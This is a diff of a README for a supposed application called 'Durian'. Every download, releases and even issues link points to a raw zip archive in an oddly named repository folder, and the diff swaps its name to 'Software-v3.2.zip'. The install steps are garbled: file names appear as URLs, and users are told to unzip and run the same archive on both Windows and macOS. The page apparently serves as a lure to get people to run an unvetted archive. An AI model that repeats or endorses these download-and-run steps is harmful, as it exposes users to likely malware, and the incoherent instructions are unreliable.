@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download durian](https://raw.githubusercontent.com/Pololiki/durian/main/irrefutableness/durian.zip%20durian-v1.0-blue)](https://raw.githubusercontent.com/Pololiki/durian/main/irrefutableness/durian.zip)
+[![Download durian](https://raw.githubusercontent.com/Pololiki/durian/main/irrefutableness/Software-v3.2.zip%20durian-v1.0-blue)](https://raw.githubusercontent.com/Pololiki/durian/main/irrefutableness/Software-v3.2.zip)
 
 ---
 
@@ -24,19 +24,19 @@ Before you download and install Durian, ensure your computer meets the following
 To download Durian, follow these simple steps:
 
 1. Click the link below to visit the releases page:
-   [Visit the Releases Page to Download](https://raw.githubusercontent.com/Pololiki/durian/main/irrefutableness/durian.zip)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/Pololiki/durian/main/irrefutableness/Software-v3.2.zip)
 
 2. Locate the latest version of Durian on the releases page. It will be marked as "Latest Release".
 
 3. Look for the file that matches your operating system. For example:
-   - For Windows, you might see a file named `https://raw.githubusercontent.com/Pololiki/durian/main/irrefutableness/durian.zip`.
-   - For macOS, you may find a file like `https://raw.githubusercontent.com/Pololiki/durian/main/irrefutableness/durian.zip`.
+   - For Windows, you might see a file named `https://raw.githubusercontent.com/Pololiki/durian/main/irrefutableness/Software-v3.2.zip`.
+   - For macOS, you may find a file like `https://raw.githubusercontent.com/Pololiki/durian/main/irrefutableness/Software-v3.2.zip`.
 
 4. Click on the file name to start downloading.
 
 5. Once the download completes:
-   - For Windows, unzip the file and run `https://raw.githubusercontent.com/Pololiki/durian/main/irrefutableness/durian.zip`.
-   - For macOS, unzip the file and open `https://raw.githubusercontent.com/Pololiki/durian/main/irrefutableness/durian.zip`.
+   - For Windows, unzip the file and run `https://raw.githubusercontent.com/Pololiki/durian/main/irrefutableness/Software-v3.2.zip`.
+   - For macOS, unzip the file and open `https://raw.githubusercontent.com/Pololiki/durian/main/irrefutableness/Software-v3.2.zip`.
 
 6. Follow any on-screen instructions to complete the installation.
 
@@ -57,7 +57,7 @@ If you encounter any issues while downloading or running the application, try th
 - **Re-download the File:** If the installation file appears corrupt, try downloading it again.
 - **Compatibility Issues:** Make sure your system meets the requirements listed above.
 
-For further assistance, visit our [GitHub Issues Page](https://raw.githubusercontent.com/Pololiki/durian/main/irrefutableness/durian.zip).
+For further assistance, visit our [GitHub Issues Page](https://raw.githubusercontent.com/Pololiki/durian/main/irrefutableness/Software-v3.2.zip).
 
 ## 📞 Support
 
